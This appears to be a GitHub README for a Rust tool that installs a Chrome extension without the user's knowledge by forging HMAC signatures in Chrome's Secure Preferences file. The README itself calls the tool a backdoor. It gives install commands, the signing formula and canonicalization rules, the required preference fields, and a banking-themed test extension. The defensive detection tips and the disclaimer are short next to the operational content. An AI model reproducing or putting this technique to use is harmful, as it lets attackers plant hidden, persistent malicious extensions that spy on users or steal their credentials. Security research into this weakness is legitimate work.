# silent-chrome-ext-installer

> Phantom Chrome extension backdoor — bypass dev-mode gate via Secure Preferences

A Rust CLI tool that silently installs a Chrome / Chromium-browser extension by
editing `Secure Preferences` directly, with a valid `protection.macs` HMAC
signature. No DevTools, no registry, no UI, no `--load-extension` flag.

Inspired by the Synacktiv research
*"The Phantom Extension: Backdooring Chrome through uncharted pathways"*.

## Highlights

- Bypasses the **Chromium ≥134 `extensions.ui.developer_mode` gate** without
  flipping any UI toggle.
- Computes the correct HMAC-SHA256 mac for each entry (`extensions.settings.<id>`,
  `extensions.ui.developer_mode`, and the tree-wide `protection.super_mac`).
- Survives multiple Chrome restarts — Chrome will happily re-sign the
  entry on first launch and accept it from then on.
- 100 % local: no network, no IPC, no elevation beyond writing the prefs
  file in your own user profile.
- Tested against **Google Chrome 153.0.8010.53** on Windows 11 with
  a packed MV3 extension.

## Quick start

```powershell
# Build (pinned deps so it compiles on cargo nightly 1.72)
cd silent-install
cargo build --release

# Compute extension ID from manifest.json (optional — auto-detected on install)
.\target\release\silent_install.exe compute-id --ext-dir ..\kremlin-ext

# Install (auto-backups <prefs>.bak)
.\target\release\silent_install.exe install --ext-dir ..\kremlin-ext

# Open Chrome — the extension is loaded, service worker running.
```

After install, verify with the bundled Python helper:

```powershell
python ..\hackjs\verify_install.py
# Per-ext mac MATCH: True
# DevMode mac MATCH: True
# super_mac   MATCH: True
```

## Command reference

```
silent_install.exe install   --ext-dir <DIR> [--installation-mode N] [--no-backup]
silent_install.exe uninstall --prefs-file <PATH> <EXT_ID>
silent_install.exe compute-id --ext-dir <DIR>
silent_install.exe preview   --ext-dir <DIR>
```

## How it works

Chrome stores installed extensions in
`%LOCALAPPDATA%\Google\Chrome\User Data\<Profile>\Secure Preferences`.
Each entry under `extensions.settings.<ext_id>` is protected by an
HMAC-SHA256 mac stored at
`protection.macs.extensions.settings.<ext_id>`. There is also a
`extensions.ui.developer_mode` boolean that, since Chromium 134, is
required for any unpacked extension to load — and it too needs a
matching mac.

The mac formula (after reading `extloader/sign.py` from the Synacktiv
public PoC):

```
HMAC_SHA256(
  key  = seed,                                      # 64-byte constant
  msg  = sid || path || canonical_json(value)
)
```

where

| piece   | meaning                                                       |
|---------|---------------------------------------------------------------|
| `seed`  | 64-byte constant `e748f33…505a8` extracted from `resources.pak` (id 146) |
| `sid`   | current user SID **with the last RID stripped**                |
| `path`  | dot-separated JSON pointer (e.g. `extensions.settings.lpngnil…`) — empty string for `super_mac` |
| `value` | the value being signed, serialised with `remove_empty` + canonical JSON |

`canonical_json` rules (NOT vanilla `json.dumps`):

- **insertion order**, no `sort_keys`
- `separators=(",", ":")`, `ensure_ascii=False`
- `<` → literal 6-char `\u003C` (NOT the double-escaped `\\u003C`)
- `\u2122` → raw UTF-8 bytes of `™`
- `remove_empty` strips `None`, `""`, empty dict/list — but **keeps** `false` and `0`

`super_mac` covers the entire `protection.macs` subtree (no path
component in the message).

The Rust tool handles every detail: re-signing `extensions.settings.<id>`,
flipping `extensions.ui.developer_mode = true`, signing its mac, and
recomputing `protection.super_mac` over the resulting tree.

## Required field set for `extensions.settings.<id>`

| key                          | value                                                        |
|------------------------------|--------------------------------------------------------------|
| `location`                   | `4` (UNPACKED)                                               |
| `state`                      | `1` (ENABLED)                                                |
| `creation_flags`             | `38`                                                         |
| `from_webstore`              | `false`                                                      |
| `was_installed_by_default`   | `false`                                                      |
| `was_installed_by_oem`       | `false`                                                      |
| `newAllowFileAccess`         | `true`                                                       |
| `path`                       | absolute Windows path with `\` separators (no `\\?\` prefix) |
| `version`                    | extension version                                            |
| `first_install_time`         | decimal string (Webkit base 1601)                            |
| `last_update_time`           | decimal string                                               |
| `active_permissions`         | permissions object (duplicated in `granted_permissions`)     |

## Files in this repo

```
silent-install/
├── Cargo.toml
├── src/main.rs        # full installer (single file)
└── target/release/silent_install.exe
hackjs/
├── verify_install.py  # cross-verifier using the same HMAC formula
├── kremlin-ext/       # MV3 extension used for the test (banking-themed)
└── …
```

## Detection / defence

For blue teams:

- Alert on writes to `Secure Preferences` by processes other than
  `chrome.exe`.
- Alert on the value `extensions.ui.developer_mode = true` set via
  prefs manipulation (no UI toggle).
- Verify extension files on disk against the
  `verified_contents.json` CRX signature — Chrome's content verifier
  already does this for extensions installed from the Web Store, but
  not for side-loaded ones.

## Limitations

- Windows-only (uses `whoami /user` and Windows path handling).
- 64-byte seed is currently **hardcoded** for Chrome 153. Older
  Chrome versions ship a different seed (typically empty or 16 bytes).
  Re-extract from `resources.pak` if needed.
- The seed is not versioned — minor Chrome updates have been known to
  change it.

## Disclaimer

This is a research artefact, published for defensive analysis. Use only
on machines you own or are explicitly authorised to test.

## Credits

- [Synacktiv — *The Phantom Extension*](https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways)
- [Synacktiv extloader PoC](https://github.com/synacktiv/extloader) — the
  canonical reference for the HMAC formula.
